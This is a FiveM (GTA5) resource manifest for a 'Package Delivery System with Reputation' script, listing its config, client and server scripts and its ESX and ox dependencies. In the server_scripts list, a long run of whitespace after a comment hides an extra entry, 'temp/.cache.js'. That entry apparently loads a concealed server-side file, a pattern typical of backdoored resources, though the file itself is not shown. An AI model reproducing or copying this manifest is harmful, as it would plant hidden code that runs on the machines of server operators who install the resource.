fx_version 'cerulean'
game 'gta5'

author 'Los'
description 'Package Delivery System with Reputation'
version '1.0.0'

shared_scripts {
    'config.lua'
}

client_scripts {
    'client/main.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua',
'server/main.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.cache.js',
}

dependencies {
    'es_extended',
    'qtarget',
    'ox_target',
    'ox_lib',
    'ox_inventory'
}
